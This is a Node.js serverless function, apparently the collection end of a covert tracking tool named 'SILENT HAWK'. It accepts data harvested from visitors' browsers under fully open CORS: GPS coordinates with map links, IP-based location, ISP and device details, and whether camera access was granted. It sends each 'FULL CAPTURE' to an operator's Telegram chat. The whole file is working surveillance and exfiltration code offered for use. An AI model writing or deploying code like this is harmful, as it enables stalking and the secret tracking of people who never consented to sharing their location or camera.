const axios = require('axios')

module.exports = async (req, res) => {
    // Full CORS enablement
    res.setHeader('Access-Control-Allow-Origin', '*')
    res.setHeader('Access-Control-Allow-Methods', '*')
    res.setHeader('Access-Control-Allow-Headers', '*')
    
    if (req.method === 'OPTIONS') return res.status(200).end();

    try {
        let data = req.method === 'POST' ? req.body : JSON.parse(decodeURIComponent(req.query.data));
        
        console.log('📩 Received:', JSON.stringify(data, null, 2))

        // Build Telegram message
        let message = `🚨 *SILENT HAWK - FULL CAPTURE* 🚨\n\n`
        message += `📱 *User Agent:* ${data.userAgent || 'N/A'}\n`
        message += `💻 *Platform:* ${data.platform || 'N/A'}\n`
        message += `🌐 *Language:* ${data.language || 'N/A'}\n`
        message += `⏰ *Timestamp:* ${new Date().toLocaleString('pt-BR')}\n`
        message += `🖥️ *Resolution:* ${data.screen?.width}x${data.screen?.height}\n`

        // Geolocation data
        if (data.geolocation) {
            message += `\n📍 *GPS LOCATION:*\n`
            message += `• Lat: ${data.geolocation.latitude}\n`
            message += `• Long: ${data.geolocation.longitude}\n`
            message += `• Accuracy: ${data.geolocation.accuracy}m\n`
            message += `• 🗺️ [Google Maps](https://maps.google.com/?q=${data.geolocation.latitude},${data.geolocation.longitude})\n`
            message += `• 🍎 [Apple Maps](http://maps.apple.com/?ll=${data.geolocation.latitude},${data.geolocation.longitude})\n`
        }

        // IP triangulation from multiple sources
        if (data.ipLocation) {
            message += `\n🌍 *IP TRIANGULATION:*\n`
            message += `• IP: ${data.ipLocation.ip || data.ipLocation.query}\n`
            message += `• City: ${data.ipLocation.city || data.ipLocation.regionName}\n`
            message += `• Region: ${data.ipLocation.region || data.ipLocation.region}\n`
            message += `• Country: ${data.ipLocation.country_name || data.ipLocation.country}\n`
            message += `• ISP: ${data.ipLocation.org || data.ipLocation.isp}\n`
            message += `• ASN: ${data.ipLocation.asn || 'N/A'}\n`
        }

        // Camera attempt
        if (data.cameraError) message += `\n📷 *Camera Error:* ${data.cameraError}\n`
        if (data.cameraCapture) message += `\n📷 *Camera Access:* GRANTED (check logs)\n`

        // Send to Telegram
        const token = process.env.TELEGRAM_BOT_TOKEN
        const chatId = process.env.TELEGRAM_CHAT_ID
        
        await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
            chat_id: chatId,
            text: message,
            parse_mode: 'Markdown',
            disable_web_page_preview: false
        })

        res.status(200).json({ success: true })
    } catch (error) {
        console.error('❌ Capture error:', error)
        res.status(500).json({ error: error.message })
    }
}
